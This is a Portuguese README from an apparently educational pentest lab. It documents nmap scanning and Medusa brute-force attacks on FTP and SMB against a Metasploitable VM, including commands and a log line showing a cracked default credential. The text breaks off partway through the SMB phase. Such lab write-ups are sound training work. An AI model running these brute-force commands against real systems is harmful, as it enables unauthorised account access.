# Projeto de Pentest: Análise de Força Bruta em Múltiplos Serviços

![Banner do Projeto](images/desola-lanre-ologun-vII7qKAk-9A-unsplash.jpg)
## 🚩 Sumário

* [Descrição do Projeto](#-descrição-do-projeto)
* [Objetivos](#-objetivos)
* [Ambiente Controlado](#-ambiente-controlado)
* [Ferramentas Utilizadas](#-ferramentas-utilizadas)
* [Fases da Execução](#-fases-da-execução)
  * [Fase 1: Reconhecimento (Scanning)](#fase-1-reconhecimento-scanning)
  * [Fase 2: Ataque de Força Bruta (FTP)](#fase-2-ataque-de-força-bruta-ftp)
  * [Fase 3: Ataque de Força Bruta (SMB)](#fase-3-ataque-de-força-bruta-smb)
  * [Fase 4: Ataque de Força Bruta (Web)](#fase-4-ataque-de-força-bruta-web)
* [Resultados e Evidências](#-resultados-e-evidências)
* [Mitigação e Recomendações](#-mitigação-e-recomendações)
* [Desafios e Aprendizados](#-desafios-e-aprendizados)
* [Autor](#-autor)

---

## 📖 Descrição do Projeto

Este projeto documenta a execução de um teste de invasão (pentest) focado em ataques de força bruta contra múltiplos serviços (FTP, SMB e Web). O objetivo foi auditar a segurança de senhas em um ambiente de laboratório controlado, utilizando a máquina vulnerável **Metasploitable** e a ferramenta **Medusa**.

Este exercício prático faz parte do [Santander - Cibersegurança 2025] e demonstra a aplicação de técnicas de auditoria de segurança ofensiva com fins estritamente educacionais e éticos.

## 🎯 Objetivos

Os principais objetivos deste desafio foram:
* Compreender na prática como funcionam os ataques de força bruta.
* Utilizar o Kali Linux e o Medusa para realizar a auditoria de serviços.
* Identificar credenciais fracas ou padrão em serviços expostos.
* Documentar o processo técnico de forma clara e estruturada.
* Propor medidas de mitigação para as vulnerabilidades encontradas.

## 🔬 Ambiente Controlado

* **Máquina Atacante:** Kali Linux (IP: `192.168.0.15`)
* **Máquina Alvo:** Metasploitable (IP: `192.168.0.10`)
* **Software de Virtualização:** Oracle VirtualBox
* **Configuração de Rede:** Host-Only

**Nota:** Todo o tráfego e atividade foram isolados neste ambiente de laboratório, sem qualquer impacto em sistemas de produção ou redes externas.

## 🛠️ Ferramentas Utilizadas

* **[Medusa](https://github.com/jmk-foofus/medusa):** A principal ferramenta para o ataque de força bruta paralelo e modular.
* **[Nmap](https://nmap.org/):** Utilizado na fase de reconhecimento para descobrir serviços e portas abertas no alvo.
* **Wordlists:**
    * `user.txt` (Arquivo com lista de usuários)
    * `password.txt` (Arquivo com lista de senhas)

---

## ⚡ Fases da Execução

Aqui será detalhado o passo a passo técnico de cada ataque.

---

### Fase 1: Reconhecimento (Scanning)

O primeiro passo foi identificar os serviços ativos na máquina alvo. Utilizei o Nmap para realizar uma varredura de portas.

**Comando Executado:**
```bash
nmap -sV -p 21,139,445,80 192.168.0.10

```
Resultados do Nmap:A varredura confirmou que todos os serviços alvo estavam ativos:PlaintextStarting Nmap 7.91 ( [https://nmap.org](https://nmap.org) )
```
Nmap scan report for 192.168.0.10
Host is up (0.0012s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: metasploitable; OS: Unix

Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
```
### ⚡Fase 2: Ataque de Força Bruta (FTP)
Com a porta 21 (FTP) confirmada como aberta, o próximo passo foi usar o Medusa para realizar um ataque de força bruta.

Comando Executado:
```bash
medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M ftp
```
Resultado (Evidência): O Medusa teve sucesso em encontrar uma credencial válida, como mostrado no log abaixo:
```
2025-11-04 22:05:54 ACCOUNT FOUND: [ftp] Host: 192.168.0.10 User: msfadmin Password: msfadmin
```
Fase 3: Ataque de Força Bruta (SMB)
Seguindo a mesma lógica do FTP, o próximo alvo foi o serviço SMB, confirmado nas portas 139 e 445 pelo Nmap.

Comando Executado:
```bash
medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M smbnt
